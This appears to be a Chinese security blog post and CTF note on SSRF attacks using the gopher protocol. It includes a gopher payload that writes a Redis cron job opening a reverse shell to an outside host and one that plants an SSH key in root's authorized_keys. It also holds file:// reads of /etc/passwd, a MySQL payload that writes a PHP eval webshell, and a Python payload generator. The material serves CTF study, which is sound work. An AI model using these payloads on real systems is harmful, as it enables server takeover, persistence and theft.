---
title: gopher 协议
date: 2026-08-24 12:40:00
categories:
  - Web安全
tags:
  - gopher
  - SSRF
description: gopher 协议
---


[gopher协议的利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/337824.html)

[SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客](https://blog.csdn.net/qq_50854662/article/details/129180268)

## 什么是gopher协议

gopher协议可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。

很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。

gopher的协议格式如下：

```php
gopher://<host>:<port>/<gopher-path>_<TCP数据流>
    
<port>默认为70
发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&也需要进行URL编码
```

## gopher发送请求

#### curl

发送端：ubuntu           监听段：vps

![image-20251217194522895](/img/ctf/gopher-protocol-001.png)

![image-20251217194552963](/img/ctf/gopher-protocol-002.png)

#### gopher协议传递HTTP的GET请求

http访问并抓包

可以直接在Burpsuite 中将数据进行编码，编码的时候在最后一定要补%0d%0a代表结束

![image-20251217201001321](/img/ctf/gopher-protocol-003.png)

转换为gopher

```
curl gopher://10.211.55.2:80/_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a
```

#### gopher协议传递HTTP的POST请求

用gopher协议传递POST请求时，必须要包含这四个，还有一个post传参

![image-20251217201635806](/img/ctf/gopher-protocol-004.png)

## gopher协议的SSRF攻击

gopher协议在ssrf的利用中一般用来攻击**redis，mysql，fastcgi，smtp**等服务。

**gopher协议数据格式：**

```
gopher://ip:port/_TCP/IP数据流
```

**注意：**

- gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行
- 数据流末尾使用%0d%0a代表消息结束

## **gopher打redis**

### 1.探测SSRF以及Redis服务

**使用file协议读取文件内容**

```php
file:///etc/passwd
file:///var/www/html/index.php
file:///usr/local/apache-tomcat/conf/server.xml
```

**使用dict协议探测开放的端口，可以看到开放了80，443，6379服务**(bp端口扫描)

```php
dict://127.0.0.1:6379/info
```

**判断redis服务有无身份验证，发现redis存在未授权访问**

```php
dict://127.0.0.1:6379/info
```

### 2.**使用gopher协议写入定时任务**

redis未授权常规写入定时任务的操作

```php
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/xxx.xx.xxx.xx/1444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

 注意：curl_exec()造成的SSRF，gopher协议需要使用二次URLEncode;而file_get_contents()造成的SSRF，gopher协议就不用进行二次URLEncode

### 3.**使用gopher协议写入ssh公钥**

常规redis未授权写入ssh公钥操作：

```php
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$576%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHSdAmmBYRnUrfOOO0N0Y/fKCLHEqt8aoc3pQPfAKStDL12rlPlf0nmkzQmPcHoHBKW6AEqb2QXWiB2TQFJTBdMXThHdZe4RzN5pLPPlqUg6dZZQhIT0/La+POIyRRVRld+8vwDw1bNpWcnlNPxf77LS9yJxQZzub6o7OWL/w2xWLexSQAYUQ9mflz4qluV+/M4iVRuZ3FNzqDWgeIziDCUaJydBpO1cisMj9TWkXCmGaj5hl1WsrffaIjsdHO6wbrZIERGh/3HDpwXlsVXc2+m9Nyxalh4qeGFVG/Fso7APhVcAfhA3lkNOTwySk+sss6JE2ic3slvIO2zXj1wI/IHMPXNb2nhnVW+WRSDp9OAcDxdLTJK0k2pVlq2yi/dWUjrcZBP3LV9pnb5ASrKmhBzxkqSPnrBhyp55qawKW2rnCeHSg9gMt/OBlMKrGnroZj+w9scuie5OxDy/7Vvr7l8vq2IbzBoWEd5d4dxCDpmtXZS/yEnIo5Y9IIQJNuOvs= root@mk50%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

### 4.Gopherus工具构造gopher协议数据流

**攻击Redis利用**：

写入计划任务，反弹shell

[Gopherus工具利用](https://blog.csdn.net/qq_50854662/article/details/129180268#:~:text=1-,Gopherus%E5%B7%A5%E5%85%B7%E6%9E%84%E9%80%A0gopher%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E6%B5%81,-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%8A%A8)

### 例题：

##### CTFshow359_打无密码的mysql

> 关于MySQL无密码:MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。

![image-20251217205239701](/img/ctf/gopher-protocol-005.png)

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%63%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%63%2e%70%68%70%27%3b%01%00%00%00%01
```

这串payload粘贴到returl参数下面，生成的 POC 里，_ 字符后面的内容还要 进行url编码。因为 PHP接收到POST或GET请求数据，自解码一次

![image-20251218171010399](/img/ctf/gopher-protocol-006.png)

![image-20251217211059302](/img/ctf/gopher-protocol-007.png)

ls /

![image-20251218170900938](/img/ctf/gopher-protocol-008.png)

cat /flag.txt

![image-20251218170941109](/img/ctf/gopher-protocol-009.png)

ctfshow{726ffae1-ea22-47d1-81e6-6de837b9acfa}

##### wireshark抓取3306原始数据包

[wireshark抓取3306原始数据包](https://www.freebuf.com/articles/web/337824.html#:~:text=%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BA%86%E3%80%82-,wireshark%E6%8A%93%E5%8F%963306%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E5%8C%85,-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%9C%A8)

## Gopher攻击mysql及内网

[SSRF利用 Gopher |Gopher攻击mysql及内网_ssrf打mysql-CSDN博客](https://blog.csdn.net/crisprx/article/details/104251284)


gopher的构造脚本：

```python
import urllib.parse
 
host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)
 
payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}
{}
""".format(host,content_length,content)
 
tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
```







